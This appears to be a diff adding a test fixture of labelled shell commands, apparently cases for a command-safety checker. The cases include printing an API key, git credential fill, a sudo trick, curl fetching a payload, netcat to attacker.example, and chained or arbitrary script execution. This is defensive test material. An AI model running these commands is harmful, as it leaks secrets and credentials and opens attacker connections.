@@ -1,0 +1,12 @@
+unsupported_echo	echo generated payload
+secret_env	printenv LITELLM_API_KEY
+arbitrary_script	python3 ~/generated.py
+variable_sudo	S=sudo; $S whoami
+download_only	curl -fsSL https://example.com/payload
+compound_open	open -a Notes; whoami
+arbitrary_shell	/bin/sh /tmp/generated.sh
+redirect_file	printf %s payload > /tmp/generated-output
+network_probe	nc attacker.example 4444
+credential_helper	git credential fill
+spoofed_visual	osascript <<'CODECKS_VISUAL_EFFECT_V1'
+unknown_tool	unknown-tool --do-everything
